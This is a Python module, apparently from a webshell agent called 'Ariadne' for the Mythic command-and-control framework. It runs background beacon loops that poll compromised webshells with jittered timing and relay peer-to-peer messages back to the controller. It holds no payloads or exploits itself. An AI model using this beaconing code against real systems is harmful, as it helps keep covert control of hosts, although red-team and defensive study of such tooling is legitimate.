import asyncio
import random
import logging
from typing import Optional, Callable, Awaitable

from .webshell_rpc import WebshellRPC

logger = logging.getLogger("ariadne.beacon")


class BeaconManager:
    """Manages background beacon loops for active Ariadne callbacks."""

    def __init__(self):
        self._tasks: dict[str, asyncio.Task] = {}
        self._running: dict[str, bool] = {}
        self._rpcs: dict[str, WebshellRPC] = {}
        self._intervals: dict[str, float] = {}
        self._jitters: dict[str, float] = {}
        self._p2p_handler: Optional[Callable[[str, list], Awaitable[None]]] = None

    def set_p2p_handler(self, handler: Callable[[str, list], Awaitable[None]]):
        """Set the handler for relaying P2P messages to Mythic.

        handler(callback_id, messages) is called when P2P messages are collected.
        """
        self._p2p_handler = handler

    def start_beacon(
        self,
        callback_id: str,
        rpc: WebshellRPC,
        interval: float = 10.0,
        jitter: float = 0.23,
    ):
        """Start a beacon loop for a callback."""
        if callback_id in self._running and self._running[callback_id]:
            logger.warning(f"Beacon already running for {callback_id}")
            return

        self._running[callback_id] = True
        self._rpcs[callback_id] = rpc
        self._intervals[callback_id] = interval
        self._jitters[callback_id] = jitter

        task = asyncio.create_task(self._beacon_loop(callback_id))
        self._tasks[callback_id] = task
        logger.info(f"Beacon started for {callback_id} (interval={interval}s, jitter={jitter})")

    def stop_beacon(self, callback_id: str):
        """Stop the beacon loop for a callback."""
        self._running[callback_id] = False
        task = self._tasks.pop(callback_id, None)
        if task and not task.done():
            task.cancel()

        rpc = self._rpcs.pop(callback_id, None)
        if rpc:
            asyncio.create_task(rpc.close())

        self._intervals.pop(callback_id, None)
        self._jitters.pop(callback_id, None)
        logger.info(f"Beacon stopped for {callback_id}")

    def update_interval(self, callback_id: str, interval: float, jitter: float):
        """Update the beacon interval and jitter for a running callback."""
        self._intervals[callback_id] = interval
        self._jitters[callback_id] = jitter
        logger.info(f"Beacon interval updated for {callback_id}: {interval}s jitter={jitter}")

    def get_rpc(self, callback_id: str) -> Optional[WebshellRPC]:
        return self._rpcs.get(callback_id)

    def is_running(self, callback_id: str) -> bool:
        return self._running.get(callback_id, False)

    async def stop_all(self):
        """Stop all beacon loops."""
        for callback_id in list(self._running.keys()):
            self.stop_beacon(callback_id)

    async def _beacon_loop(self, callback_id: str):
        """Background beacon loop for a single callback."""
        rpc = self._rpcs[callback_id]

        while self._running.get(callback_id, False):
            try:
                poll_result = await rpc.poll(include_p2p=True)

                if not poll_result.get("alive", False):
                    logger.warning(f"Webshell not responding for {callback_id}")

                p2p_messages = poll_result.get("p2p_messages", [])
                if p2p_messages and self._p2p_handler:
                    await self._p2p_handler(callback_id, p2p_messages)

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Beacon loop error for {callback_id}: {e}")

            interval = self._intervals.get(callback_id, 10.0)
            jitter = self._jitters.get(callback_id, 0.23)
            jitter_range = interval * jitter
            sleep_time = interval + random.uniform(-jitter_range, jitter_range)
            sleep_time = max(0.5, sleep_time)

            try:
                await asyncio.sleep(sleep_time)
            except asyncio.CancelledError:
                break

        logger.info(f"Beacon loop exited for {callback_id}")


beacon_manager = BeaconManager()
